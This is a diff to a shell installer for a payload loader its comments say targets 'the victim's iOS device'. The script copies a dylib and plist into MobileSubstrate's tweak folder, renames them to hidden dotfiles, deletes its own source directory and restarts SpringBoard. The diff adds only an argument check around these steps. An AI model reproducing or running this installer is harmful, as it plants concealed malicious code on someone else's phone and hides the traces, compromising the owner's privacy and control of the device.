@@ -31,9 +31,17 @@
 # Install it using MPL on the victim's iOS device.
 # Do not install it without Mouse Payload Loader (MPL)
 
+if [[ $1 = "--ignore-package" ]]
+then
 cp mpl.dylib /Library/MobileSubstrate/DynamicLibraries
 cp mpl.plist /Library/MobileSubstrate/DynamicLibraries
 mv /Library/MobileSubstrate/DynamicLibraries/mpl.dylib /Library/MobileSubstrate/DynamicLibraries/.mpl.dylib
 mv /Library/MobileSubstrate/DynamicLibraries/mpl.plist /Library/MobileSubstrate/DynamicLibraries/.mpl.plist
 cd .. && rm -r mouse
 killall SpringBoard
+else
+sleep 0.5
+echo -e "Error, it is not a single package!"
+sleep 0.5
+exit
+fi
